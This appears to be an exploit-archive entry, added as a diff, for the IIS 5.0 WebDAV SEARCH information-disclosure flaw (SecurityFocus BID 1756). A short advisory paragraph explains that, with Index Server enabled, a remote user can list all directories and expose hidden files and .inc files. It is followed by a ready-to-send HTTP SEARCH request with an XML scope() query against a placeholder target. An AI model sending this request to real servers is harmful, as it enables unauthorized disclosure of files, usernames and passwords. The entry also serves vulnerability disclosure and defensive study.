@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/1756/info
+
+If Index Server is enabled in Microsoft Internet Information Server 5.0, it is possible for a remote user to view the entire root directory structure and all sub-directories due to a flaw in the Web Distributed Authoring and Versioning (WebDAV) search implementation. Hidden directories, include files (*.inc), or other documents that would not normally be accessible through the regular website interface can be exposed through this exploit.
+
+Successful exploitation could lead to the discovery of certain files that may contain sensitive information such as usernames and passwords.
+
+The Index Server is disabled by default in IIS 5.0 and only directories that have the 'Index' property set are affected by this vulnerability. 
+
+SEARCH / HTTP/1.1
+Host: target
+Content-Type: text/xml
+Content-Length: 133
+
+<?xml version="1.0"?>
+<g:searchrequest xmlns:g="DAV:">
+<g:sql>
+Select "DAV:displayname" from scope()
+</g:sql>
+</g:searchrequest>
+
